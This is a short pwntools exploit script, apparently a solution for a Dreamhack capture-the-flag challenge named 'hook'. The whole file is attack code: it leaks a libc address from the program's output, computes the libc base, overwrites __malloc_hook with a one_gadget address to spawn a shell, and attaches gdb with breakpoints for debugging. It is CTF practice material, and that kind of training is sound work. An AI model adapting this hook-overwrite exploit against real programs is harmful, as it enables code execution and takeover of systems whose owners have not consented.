from pwn import *
# p = remote("host3.dreamhack.games", 10461)
p = process("./hook_patched")
context.log_level = "debug"
e = ELF("./hook_patched")
libc = ELF("./libc.so.6")
gdb.attach(p, gdbscript='''
           b*main+158
           b*main+128
           c
           ''')

input()
one_gadget = 0x4526a

p.recvuntil("stdout: ")
stdout = int(p.recv(14), 16)

libc_base = stdout - 3954208
malloc_hook = libc_base + 3951376
magic = libc_base + one_gadget
log.info(hex(libc_base) + " " + hex(malloc_hook))
payload = p64(malloc_hook) + p64(magic)

p.sendlineafter(b"Size: ", b"50")


p.sendlineafter(b"Data: ", payload)

p.interactive()
